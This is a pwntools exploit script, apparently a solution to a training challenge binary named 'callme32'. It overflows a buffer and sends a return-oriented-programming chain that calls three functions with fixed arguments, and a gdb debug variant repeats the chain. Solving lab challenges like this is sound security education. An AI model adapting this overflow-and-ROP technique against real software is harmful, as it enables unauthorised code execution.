#!/usr/bin/env python
# -=-<[ Bismillahirrahmanirrahim ]>-=-
# -*- coding: utf-8 -*-
# @Date    : 2022-03-03 14:32:49
# @Author  : Dahir Muhammad Dahir (dahirmuhammad3@gmail.com)
# @Link    : link
# @Version : 1.0.0


from pwn import *
import importlib


context.arch = "i386"

filename = "./callme32"
target_binary = ELF(filename)
target_process = process(filename)


def exploit():
    exploit_rop = ROP(target_binary)

    # function arguments
    arg_one = 0xdeadbeef
    arg_two = 0xcafebabe
    arg_three = 0xd00df00d

    # function addresses
    call_one = 0x080484f0
    call_two = 0x08048550
    call_three = 0x080484e0

    exploit_rop.raw(call_one)
    exploit_rop.raw(0x80487f9)
    exploit_rop.raw(arg_one)
    exploit_rop.raw(arg_two)
    exploit_rop.raw(arg_three)
    exploit_rop.raw(call_two)
    exploit_rop.raw(0x80487f9)
    exploit_rop.raw(arg_one)
    exploit_rop.raw(arg_two)
    exploit_rop.raw(arg_three)
    exploit_rop.raw(call_three)
    exploit_rop.raw(0x80487f9)
    exploit_rop.raw(arg_one)
    exploit_rop.raw(arg_two)
    exploit_rop.raw(arg_three)

    print(exploit_rop.dump())

    chain = exploit_rop.chain()
    trash = cyclic(0x28 + 0x4)

    target_process.send(trash + chain + cyclic(512 - 0x28 - 0x4 - len(chain)))
    target_process.interactive()


def debug():
    gdbscript = """
    break *0x08048739
    break *0x080484f0
    break *0x08048550
    break *0x080484e0
    start
    continue
    """
    gdb.attach(target_process, gdbscript=gdbscript)
    
    debug_rop = ROP(target_binary)

    # function arguments
    arg_one = 0xdeadbeef
    arg_two = 0xcafebabe
    arg_three = 0xd00df00d

    # function addresses
    call_one = 0x080484f0
    call_two = 0x08048550
    call_three = 0x080484e0

    debug_rop.raw(call_one)
    debug_rop.raw(0x80487f9)
    debug_rop.raw(arg_one)
    debug_rop.raw(arg_two)
    debug_rop.raw(arg_three)
    debug_rop.raw(call_two)
    debug_rop.raw(0x80487f9)
    debug_rop.raw(arg_one)
    debug_rop.raw(arg_two)
    debug_rop.raw(arg_three)
    debug_rop.raw(call_three)
    debug_rop.raw(0x80487f9)
    debug_rop.raw(arg_one)
    debug_rop.raw(arg_two)
    debug_rop.raw(arg_three)

    print(debug_rop.dump())

    chain = debug_rop.chain()
 
    trash = cyclic(0x28 + 0x4)

    target_process.send(trash + chain + cyclic(512 - 0x28 - 0x4 - len(chain)))
    target_process.interactive()


if __name__ == "__main__":
    # debug()
    exploit()

